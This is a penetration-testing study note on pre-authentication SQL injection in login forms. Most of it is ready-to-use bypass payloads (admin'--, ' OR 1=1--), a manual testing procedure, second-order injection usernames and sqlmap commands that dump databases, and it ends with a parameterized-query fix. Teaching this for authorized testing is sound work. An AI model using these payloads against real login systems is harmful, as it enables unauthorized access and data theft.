---
tags: [vapt, authentication, sqli, intermediate]
difficulty: intermediate
module: "16 - Authentication"
topic: "16.23 Pre-Authentication SQLi"
portswigger_labs: ["SQL injection UNION attack, finding a column containing text"]
---

# 16.23 — Pre-Authentication SQL Injection

## What Is Pre-Auth SQLi?

```
PRE-AUTH SQLi:
  SQL injection that can be exploited WITHOUT being logged in
  
  The login form itself queries the database:
  SELECT * FROM users WHERE username='INPUT' AND password=MD5('INPUT')
  
  If username or password inputs are not sanitized → SQL injection!
  
  IMPACT:
  - Bypass authentication entirely (login as admin without password)
  - Dump the database without any credentials
  - One of the most critical vulnerability combinations!
```

---

## Classic Auth Bypass via SQLi

```sql
-- VULNERABLE QUERY:
SELECT * FROM users WHERE username='INPUT' AND password='INPUT'

-- ATTACK (input username):
admin' --
admin'#         (MySQL comment)
admin'/*        (another comment)

-- RESULTING QUERY:
SELECT * FROM users WHERE username='admin' --' AND password='wrongpass'
-- Everything after -- is a comment! Password check removed!
-- Returns the admin user → logged in as admin!

-- OR bypass with universal:
' OR '1'='1' --
' OR 1=1 --
' OR 'x'='x

-- RESULTING QUERY:
SELECT * FROM users WHERE username='' OR '1'='1' --' AND password='...'
-- '1'='1' is always true → returns ALL users → logged in as first user!

-- ADMIN SPECIFICALLY:
admin'/**/OR/**/1=1--
' OR username='admin'--
```

---

## Testing Login Form for SQLi

```
STEP 1: Try basic payloads in username:
  '                    → SQL error? Missing closing quote!
  admin'--             → Login without password?
  ' OR 1=1--           → Login as first user?
  
STEP 2: Try in password field:
  wrongpassword' OR '1'='1
  wrongpassword' OR 1=1--
  
STEP 3: Check error messages:
  "MySQL syntax error" → raw SQL error visible → definitely injectable!
  Blank response → might still be injectable (blind)
  
STEP 4: Check with Burp:
  Send login POST to Repeater
  Add ' to username → send → look for different response
  Timing: add SLEEP(5) → response takes 5+ seconds → blind SQLi!
```

---

## SQLMAP on Login

```bash
# STEP 1: Capture login request to file:
# In Burp: right-click request → Save item → save as login.txt

# STEP 2: Run sqlmap:
sqlmap -r login.txt --level=5 --risk=3 --batch

# TARGET SPECIFIC PARAMETER:
sqlmap -r login.txt -p username --batch

# COMMON SQLMAP FLAGS FOR LOGIN:
sqlmap -r login.txt \
  --forms \           # automatically detect forms
  --batch \           # no interactive prompts
  --dump \            # dump database if injectable
  --level=5 \         # thoroughness (1-5)
  --risk=3            # risk of time-based payloads (1-3)

# AUTHENTICATION BYPASS:
sqlmap -r login.txt --technique=BEUSTQ --auth-type=FORM \
  --data="username=admin&password=test" \
  --string="Welcome" --not-string="Invalid"
```

---

## Second-Order SQLi at Login

```
SECOND ORDER (STORED SQLi):
  Registration: save malicious username → stored in DB
  Login / Profile fetch: retrieve and use unsanitized username in query
  
EXAMPLE:
  Register username: admin'--
  
  Later, when profile is loaded:
  SELECT * FROM posts WHERE author='admin'--'
  → Broken! The stored SQLi fires when username is USED in another query!
  
TEST:
  Register unusual usernames:
  admin'--
  test" OR 1=1--
  
  Then: perform actions that use username in queries
  → Password change, profile update, admin lookup
  → Watch for errors or unexpected behavior
```

---

## Authentication Bypass Specific Payloads

```
USERNAME FIELD PAYLOADS:
  admin'--
  admin' #
  admin'/*
  ' OR '1'='1
  ' OR 1=1--
  ' OR 1=1#
  "admin"--
  admin" --
  ') OR ('1'='1
  ')) OR (('1'='1
  ' OR username LIKE '%admin%'--
  
PASSWORD FIELD PAYLOADS (with valid username):
  password' OR '1'='1
  password') OR ('1'='1
  wrongpass' OR 1=1--
  x' OR password LIKE '%
  
BOTH FIELDS:
  Username: admin
  Password: ' OR 1=1--
  
  Username: ' OR 1=1--
  Password: anything
```

---

## Fix

```
DEFENSE:
  ✓ PARAMETERIZED QUERIES (Prepared Statements):
  
  # Python (bad):
  query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
  
  # Python (good):
  cursor.execute("SELECT * FROM users WHERE username=? AND password=?", (username, password))
  
  # PHP (good - PDO):
  $stmt = $pdo->prepare("SELECT * FROM users WHERE username=? AND password=?");
  $stmt->execute([$username, $password]);
  
  ✓ NEVER include raw user input in SQL strings
  ✓ Use ORM (SQLAlchemy, Hibernate, ActiveRecord) — parameterizes by default
  ✓ Least privilege DB user for login queries (can't DROP, can't SELECT ALL)
  ✓ Error handling: never show raw SQL errors to users
```

---

## Related Notes
- [[Module 06 - SQL Injection]] — full SQLi deep dive
- [[01 - Username Enumeration]] — often co-occurs with SQLi
- [[28 - Defense Rate Limiting Lockout MFA]] — defense guide
